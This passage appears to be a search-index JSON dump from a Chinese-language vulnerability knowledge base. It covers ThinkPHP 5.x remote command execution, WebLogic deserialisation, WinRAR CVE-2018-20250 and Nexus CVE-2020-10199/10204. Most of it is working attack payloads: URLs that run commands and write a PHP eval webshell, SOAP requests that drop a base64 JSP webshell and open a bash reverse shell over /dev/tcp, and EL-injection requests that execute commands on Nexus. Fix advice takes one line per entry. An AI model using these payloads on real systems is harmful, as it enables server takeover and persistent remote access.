\u5305\u542b\u4efb\u610f.php\u6587\u4ef6 ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id 5.1.x","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 ThinkPHP 5.0.x < 5.0.23 ThinkPHP 5.1.x < 5.1.31 \u6f0f\u6d1ePOC \u00b6 phpinfo\uff1a /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 \u7cfb\u7edf\u547d\u4ee4\u6267\u884c\uff1a /index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami \u5199shell\uff1a /index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_GET[\"cmd\"])?>","title":"Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"ThinkPHP 5.0.x < 5.0.23 ThinkPHP 5.1.x < 5.1.31","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"phpinfo\uff1a /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 \u7cfb\u7edf\u547d\u4ee4\u6267\u884c\uff1a /index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami \u5199shell\uff1a /index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_GET[\"cmd\"])?>","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%20%E5%85%A8%E7%89%88%E6%9C%ACsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 ThinkPHP \u5168\u7248\u672c \u6f0f\u6d1ePOC \u00b6 \u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f","title":"Thinkphp \u5168\u7248\u672csql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%20%E5%85%A8%E7%89%88%E6%9C%ACsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"ThinkPHP \u5168\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%20%E5%85%A8%E7%89%88%E6%9C%ACsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"\u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/","text":"POC \u00b6","title":"UsualToolCMS-8.0 sql\u6ce8\u2f0a\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/#poc","text":"","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/Weblogic%20GIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","text":"","title":"Weblogic GIOP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 WebLogic 10.* / WebLogic 12.1.3.0 Docker \u642d\u5efa\u73af\u5883 \u00b6 docker pull ismaleiva90/weblogic12 docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest http://localhost:49163/console User: weblogic Pass: welcome1 http://192.168.247.129:49163/_async/AsyncResponseService \u786e\u5b9a\u76ee\u6807\u7cfb\u7edf\u5bf9\u5916\u5f00\u653e/_async/AsyncResponseService\u8def\u5f84\uff0c\u5b58\u5728\u6b64\u6f0f\u6d1e \u5199\u5165shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49163 Content-Length: 1383 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope> \u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u4e86\uff0c\u7136\u540e\u6211\u4eec\u5c1d\u8bd5\u53cd\u5f39shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49164 Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>bash -i >& /dev/tcp/192.168.247.129/12345 0>&1</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope>","title":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eCNVD-C-2019-48814"},{"location":"Web%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/#_1","text":"WebLogic 10.* / WebLogic 12.1.3.0","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/#docker","text":"docker pull ismaleiva90/weblogic12 docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest http://localhost:49163/console User: weblogic Pass: welcome1 http://192.168.247.129:49163/_async/AsyncResponseService \u786e\u5b9a\u76ee\u6807\u7cfb\u7edf\u5bf9\u5916\u5f00\u653e/_async/AsyncResponseService\u8def\u5f84\uff0c\u5b58\u5728\u6b64\u6f0f\u6d1e \u5199\u5165shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49163 Content-Length: 1383 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope> \u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u4e86\uff0c\u7136\u540e\u6211\u4eec\u5c1d\u8bd5\u53cd\u5f39shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49164 Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>bash -i >& /dev/tcp/192.168.247.129/12345 0>&1</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope>","title":"Docker \u642d\u5efa\u73af\u5883"},{"location":"Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D/","text":"Web\u5b89\u5168\u7b80\u4ecb \u00b6 \u7b49\u5f85\u4e00\u4f4d\u5927\u4f6c\u6765\u5199 Web \u5b89\u5168\u7b80\u4ecb~","title":"Web\u5b89\u5168\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D/#web","text":"\u7b49\u5f85\u4e00\u4f4d\u5927\u4f6c\u6765\u5199 Web \u5b89\u5168\u7b80\u4ecb~","title":"Web\u5b89\u5168\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/","text":"\u7b80\u4ecb \u00b6 UNACE.DLL\u662fWinRAR\u6240\u4f7f\u7528\u7684\u4e00\u4e2a\u9648\u65e7\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u7528\u4e8e\u5904\u7406ACE\u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u57282006\u5e74\u88ab\u7f16\u8bd1\uff0c\u6ca1\u6709\u4efb\u4f55\u9632\u62a4\u63aa\u65bd\u3002 \u5bfc\u81f4WinRAR\u5728\u89e3\u538b\u5904\u7406ACE\u683c\u5f0f\u7684\u6587\u4ef6\u7684\u8fc7\u7a0b\u4e2d\u5b58\u5728\u4e00\u5904\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u5141\u8bb8\u89e3\u538b\u8fc7\u7a0b\u4e2d\u5411\u4efb\u610f\u76ee\u5f55\u5199\u5165\u6587\u4ef6\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u5411\u5f00\u673a\u542f\u52a8\u76ee\u5f55\u4e2d\u5199\u5165\u6076\u610f\u6587\u4ef6\u5bfc\u81f4\u673a\u5668\u5f00\u673a\u65f6\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c \u00b6 WinRAR < 5.70 Beta 1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 Poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1YasUUwwuuTDe8fU3pccLzA \u63d0\u53d6\u7801\uff1az3qn \u5c06poc\u6587\u4ef6\u5982\u4e0b\uff0c\u4f7f\u7528win7\u81ea\u5e26\u7684calc.exe\u8fdb\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u3002 \u5bf9exp.py\u4e2d\u4e09\u4e2a\u914d\u7f6e\u9879\u8fdb\u884c\u914d\u7f6e\uff0c\u5982\u4e0b\uff1a \u8fd0\u884cexp.py\uff1a \u4f1a\u751f\u6210test.rar\u6587\u4ef6\uff0c\u5c06rar\u89e3\u538b\u5230\u5f53\u524d\u76ee\u5f55C:\\Users\\user\\Downloads\uff0c\u5219calc.bat\u4f1a\u81ea\u52a8\u91ca\u653e\u5230C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u4e2d\u3002 \u7531\u4e8eUNACEV2.dll\u4e2d\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790\u89e3\u538b\u8def\u5f84\u201dC:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hi.exe\u201d\u65f6\uff0c\u9047\u5230\u201d../\u201d\u7b26\u53f7\u4f1a\u8df3\u8fc7\u904d\u5386\u5faa\u73af\uff0c\u76f4\u63a5\u8fd4\u56de\u8def\u5f84\u201d C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hi.exe\u201d\uff0c\u5b9e\u73b0\u8def\u5f84\u7a7f\u8d8a\uff0c\u91ca\u653e\u6076\u610f\u7a0b\u5e8f\u5230\u542f\u52a8\u9879\uff0c\u5f53\u7528\u6237\u91cd\u542f\u8ba1\u7b97\u673a\u65f6\u4f1a\u81ea\u52a8\u8fd0\u884c\u8be5\u6076\u610f\u7a0b\u5e8f\uff1a \u5f00\u673a\u5219\u4f1a\u81ea\u542f\u52a8calc.exe!\u5982\u4e0b\uff01 \u4fee\u590d\u5efa\u8bae \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"WinRAR\u7a7f\u900f\u6f0f\u6d1e\uff08CVE-2018-20250\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_1","text":"UNACE.DLL\u662fWinRAR\u6240\u4f7f\u7528\u7684\u4e00\u4e2a\u9648\u65e7\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u7528\u4e8e\u5904\u7406ACE\u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u57282006\u5e74\u88ab\u7f16\u8bd1\uff0c\u6ca1\u6709\u4efb\u4f55\u9632\u62a4\u63aa\u65bd\u3002 \u5bfc\u81f4WinRAR\u5728\u89e3\u538b\u5904\u7406ACE\u683c\u5f0f\u7684\u6587\u4ef6\u7684\u8fc7\u7a0b\u4e2d\u5b58\u5728\u4e00\u5904\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u5141\u8bb8\u89e3\u538b\u8fc7\u7a0b\u4e2d\u5411\u4efb\u610f\u76ee\u5f55\u5199\u5165\u6587\u4ef6\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u5411\u5f00\u673a\u542f\u52a8\u76ee\u5f55\u4e2d\u5199\u5165\u6076\u610f\u6587\u4ef6\u5bfc\u81f4\u673a\u5668\u5f00\u673a\u65f6\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002","title":"\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_2","text":"WinRAR < 5.70 Beta 1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_3","text":"Poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1YasUUwwuuTDe8fU3pccLzA \u63d0\u53d6\u7801\uff1az3qn \u5c06poc\u6587\u4ef6\u5982\u4e0b\uff0c\u4f7f\u7528win7\u81ea\u5e26\u7684calc.exe\u8fdb\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u3002 \u5bf9exp.py\u4e2d\u4e09\u4e2a\u914d\u7f6e\u9879\u8fdb\u884c\u914d\u7f6e\uff0c\u5982\u4e0b\uff1a \u8fd0\u884cexp.py\uff1a \u4f1a\u751f\u6210test.rar\u6587\u4ef6\uff0c\u5c06rar\u89e3\u538b\u5230\u5f53\u524d\u76ee\u5f55C:\\Users\\user\\Downloads\uff0c\u5219calc.bat\u4f1a\u81ea\u52a8\u91ca\u653e\u5230C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u4e2d\u3002 \u7531\u4e8eUNACEV2.dll\u4e2d\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790\u89e3\u538b\u8def\u5f84\u201dC:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hi.exe\u201d\u65f6\uff0c\u9047\u5230\u201d../\u201d\u7b26\u53f7\u4f1a\u8df3\u8fc7\u904d\u5386\u5faa\u73af\uff0c\u76f4\u63a5\u8fd4\u56de\u8def\u5f84\u201d C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hi.exe\u201d\uff0c\u5b9e\u73b0\u8def\u5f84\u7a7f\u8d8a\uff0c\u91ca\u653e\u6076\u610f\u7a0b\u5e8f\u5230\u542f\u52a8\u9879\uff0c\u5f53\u7528\u6237\u91cd\u542f\u8ba1\u7b97\u673a\u65f6\u4f1a\u81ea\u52a8\u8fd0\u884c\u8be5\u6076\u610f\u7a0b\u5e8f\uff1a \u5f00\u673a\u5219\u4f1a\u81ea\u542f\u52a8calc.exe!\u5982\u4e0b\uff01","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_4","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/","text":"nexus repository oss \u00b6 Nexus Repository OSS 3\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u4ed3\u5e93\u7ba1\u7406\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u66f4\u52a0\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u800c\u4e14\u5b89\u88c5\u3001\u914d\u7f6e\u3001\u4f7f\u7528\u8d77\u6765\u4e5f\u66f4\u52a0\u7b80\u5355\u65b9\u4fbf\u3002OSS 3\u7248\u672c\u4e3b\u8981\u652f\u6301\u7684\u4ed3\u5e93\uff08Repository\uff09\u5305\u62ec\u5982\u4e0b\uff1a bower\u3001docker\u3001maven\u3001npm\u3001nuget\u3001pypi\u3001raw\u3001rubygems\u3001yum \u6f0f\u6d1e\u8be6\u60c5 \u00b6 10199\u7684\u6f0f\u6d1e\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\u5373\u53ef\u89e6\u53d1\uff0c\u800c10204\u5219\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e24\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u539f\u56e0\u5747\u662f\u4e0d\u5b89\u5168\u7684\u6267\u884cEL\u8868\u8fbe\u5f0f\u5bfc\u81f4\u7684 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u542f\u52a8\u6f0f\u6d1e\u73af\u5883 docker run -it -p 8081:8081 -d co0ontty/cve-2020-10199 \u67e5\u770b\u7528\u6237\u540d\u5bc6\u7801 \u67e5\u770b DOCKER CONTAINER ID docker ps \u67e5\u770b\u5bc6\u7801 \u5176\u4e2d bc91335e3518 \u4e3a DOCKER CONTAINER ID docker exec -it bc91335e3518 cat /root/sonatype-work/nexus3/admin.password \u8bbf\u95ee http://ip:8081 cve-2020-10199 \u00b6 \u547d\u4ee4\u6267\u884c\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 372 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close {\"action\":\"cleanup_CleanupPolicy\",\"method\":\"create\",\"data\":[{\"name\":\"co0ontty\",\"format\":\"$\\.{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /opt/cve-2020-10199')}\",\"notes\":\"222\",\"mode\":\"delete\",\"lastBlobUpdatedEnabled\":false,\"lastDownloadedEnabled\":false,\"releaseTypeEnabled\":false,\"regexEnabled\":false,\"criteria\":{}}],\"type\":\"rpc\",\"tid\":33} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10199-1.png) \u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff1a POST /service/rest/beta/repositories/apt/hosted HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 358 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close { \"name\": \"interna1l\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true, \"writePolicy\": \"allow_once\" }, \"cleanup\": { \"policyNames\": [\"co0ontty\"] }, \"apt\": { \"distribution\": \"bionic\" }, \"aptSigning\": { \"keypair\": \"string\", \"passphrase\": \"string\" } } ``` cve-2020-10204 \u00b6 \u547d\u4ee4\u6267\u884c\u4e00\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 362 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close {\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"test\",\"version\":\"4\",\"firstName\":\"test\",\"lastName\":\"test\",\"email\":\"test@qq.com\",\"status\":\"active\",\"roles\":[\"nx-admin$\\.{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /opt/co0ontty.success')}\"]}],\"type\":\"rpc\",\"tid\":20} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10204.png) \u547d\u4ee4\u6267\u884c\u4e8c\uff1a POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 214 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=6d9fd8c5-4b18-4680-b332-09600e9d34b5 Connection: close { \"name\": \"interna1l\", \"online\": true, \"group\": { \"memberNames\": [\"${'co0ontty'.toUpperCase()}\"] }, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true } } ``` \u89e3\u51b3\u65b9\u6848 \u00b6 \u8bf7\u5347\u7ea7\u7248\u672c\u5230 Nexus Repository Manager OSS/Pro 3.21.2 \u6216\u66f4\u9ad8\u7248\u672c \u851a\u84dd\u76fe\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u5df2\u652f\u6301\u5bf9 CVE-2020-10199 \u53ca CVE-2020-10204 \u7684\u9632\u5fa1","title":"nexus oss \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e (cve-2020-10199 && 10204)"},{"location":"Web%E5%AE%89%E5%85%A8/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#nexus-repository-oss","text":"Nexus Repository OSS 3\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u4ed3\u5e93\u7ba1\u7406\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u66f4\u52a0\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u800c\u4e14\u5b89\u88c5\u3001\u914d\u7f6e\u3001\u4f7f\u7528\u8d77\u6765\u4e5f\u66f4\u52a0\u7b80\u5355\u65b9\u4fbf\u3002OSS 